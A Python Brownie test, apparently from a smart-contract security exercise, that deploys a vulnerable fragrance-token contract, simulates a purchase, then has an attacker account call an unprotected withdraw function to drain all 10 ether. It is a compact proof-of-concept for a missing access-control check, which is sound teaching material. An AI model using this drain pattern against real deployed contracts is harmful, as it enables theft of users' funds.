from brownie import accounts, KilianExclusive

def test_access_control_3():
    # Assinging accounts
    [dep, user, attacker] = accounts[:3]

    # Deploying target
    ac3 = KilianExclusive.deploy({'from': dep})
    # Adding the fragarance
    ac3.addFragrance("SCH Fragrance", {'from': dep})
    # Flipping its sales state
    ac3.flipSaleState()
    # Simulating normal purchase from user account
    ac3.purchaseFragrance(1, {'from': user.address, 'value': '10 ether'}).wait(1)
    # Asserting ownership fro acquired token 'Frangrance'
    assert(ac3.ownerOf(1) == user.address)
    # Asserting new contract balance of 10 ethers, post purchase
    assert(ac3.balance() == '10 ether')
    # assigning variable with attacker initial balance
    initialBal = attacker.balance()
    # Attacker calls unprotected withdraw and drains it all
    ac3.withdraw(attacker.address, {'from':attacker.address}).wait(1)
    #asserting new balance
    assert(attacker.balance() == initialBal + '10 ether')
    #asserting contract balance equals 0
    assert(ac3.balance() == 0)
